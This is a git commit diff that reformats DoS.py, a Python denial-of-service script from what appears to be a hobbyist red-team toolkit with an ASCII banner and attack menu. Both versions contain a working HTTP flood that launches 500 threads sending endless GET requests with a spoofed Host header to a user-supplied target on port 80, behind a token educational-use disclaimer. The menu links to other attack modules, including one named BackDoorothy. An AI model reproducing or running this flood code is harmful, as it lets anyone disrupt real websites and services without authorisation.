c829a4a8f78111aca60338337883b791d6807295
Owen Jones <142271569+NTPOJ@users.noreply.github.com>
2024-02-18 17:10:45 +1100

    Update DoS.py

--- DoS.py
+++ DoS.py
@@ -1,96 +1,88 @@
-#Imported modules
 import socket
 import sys
 import threading
 import pyfiglet
 import colorama
 from colorama import Fore
+
 colorama.init()
 
-ascii_banner = pyfiglet.figlet_format("Red-Team fun time")
+ascii_banner = pyfiglet.figlet_format("Han-Tyumi")
 print(Fore.CYAN + ascii_banner)
 
-print("DoS Time")
-print("""
-               \ /                                          \   /
-              --o--           `\\             //'      .____-/.\-____.
-                                \\           //             ~`-'~
-                                 \\. __-__ .//
-                       ___/-_.-.__`/~     ~\'__.-._-\___                    
-.|.       ___________.'__/__ ~-[ \.\'-----'/./ ]-~ __\__`.___________       .|.
-~o~~~~~~~--------______-~~~~~-_/_/ |   .   | \_\_-~~~~~-______--------~~~~~~~o~
-' `               + + +  (X)(X)  ~--\__ __/--~  (X)(X)  + + +               ' `
-                             (X) `/.\' ~ `/.\' (X)  
-                                 "\_/"   "\_/" 
- Artist: *Unknown*""")
-print("-" * 50)
-print("[*] Disclaimer: This script is to be used only for educational purposes. Do not run script against unauthorized IP's without prior consent.")
-print("[*] This script is configured only to attack port 80.")
-print("[*] If this program is used by bad actors, we aren't to be held accountable for the repercussions")
-print("-" * 50)
-target = input("Enter target IP:")
-fake_ip = input("Enter host IP:")
-#Specifies port to run attack on
-port = 80
+print("Hello, My name is Han-Tyumi. I am a cyborg. Born, if you may call it that, into a world that is dense and black.")
 
-#Attack is defined with sockets module
-#Send HTTP GET requests to target IP
-#HOST can be any IP address. Can use fake IP to mask attack
-def attack():
-	while True:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target, port))
-		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-		s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		s.close()
+while True:
+    print("-" * 50)
+    print("[*] Disclaimer: This script is to be used only for educational purposes. Do not run script against unauthorized IP's without prior consent.")
+    print("[*] This script is configured only to attack port 80.")
+    print("[*] If this program is used by bad actors, we aren't to be held accountable for the repercussions")
+    print("-" * 50)
+    target = input("Enter target IP:")
+    fake_ip = input("Enter host IP:")
 
-#Runs 500 threads of the defined attack
-#Threads can be set to a higher numebr for more requests.
-for i in range(500):
-	thread = threading.Thread(target=attack)
-	thread.start()
+    # Specifies port to run attack on
+    port = 80
 
-attack_num = 0
+    # Attack is defined with sockets module
+    # Send HTTP GET requests to target IP
+    # HOST can be any IP address. Can use fake IP to mask attack
+    def attack():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
 
-#Attack output is defined
-def attack():
-	while True:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((target, port))
-		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-		s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-		s.close()
+    # Runs 500 threads of the defined attack
+    # Threads can be set to a higher number for more requests.
+    for i in range(500):
+        thread = threading.Thread(target=attack)
+        thread.start()
 
-#Global allows to modify variable 
-		global attack_num
-		attack_num += 1
-		print(attack_num)
+    attack_num = 0
 
-		s.close
+    # Attack output is defined
+    def attack():
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
 
-print("What's next commrade?")
+            # Global allows to modify variable
+            global attack_num
+            attack_num += 1
+            print(attack_num)
 
-print("[1]. Back to base!")
-print("[2]. MORE POWER!")
-print("[3]. Cyboogie!")
-print("[4]. We need R&D!")
-print("[5]. Survey their ports!")
-print("[6]. Exit")
+            s.close()
 
-#Imports scripts for each attack based on number chosen, back home or exit
-selection = input("Choose wisely")
-if selection == "1":
-	import Harpocratic_Blackbird
-elif selection == "2":
-	import DoS
-elif selection == "3":
-	import robots_crawler
-elif selection == "4":
-	import nslookup
-elif selection == "5":
-	import BackDoorothy
-elif selection == "6":
-	sys.exit()
-else:
-	print("Invalid Selection. Enter 1-6.")
+    print("What's next comrade?")
 
+    print("[1]. Back to base!")
+    print("[2]. MORE POWER!")
+    print("[3]. Cyboogie!")
+    print("[4]. We need R&D!")
+    print("[5]. Survey their ports!")
+    print("[6]. Exit")
+
+    # Imports scripts for each attack based on the number chosen, back home, or exit
+    selection = input("Choose wisely: ")
+
+    if selection == "1":
+        import Harpocratic_Blackbird
+    elif selection == "2":
+        # Continue to the next iteration of the loop
+        continue
+    elif selection == "3":
+        import Cyboogie
+    elif selection == "4":
+        import nslookup
+    elif selection == "5":
+        import BackDoorothy
+    elif selection == "6":
+        sys.exit()
+    else:
+        print("Invalid Selection. Enter 1-6.")
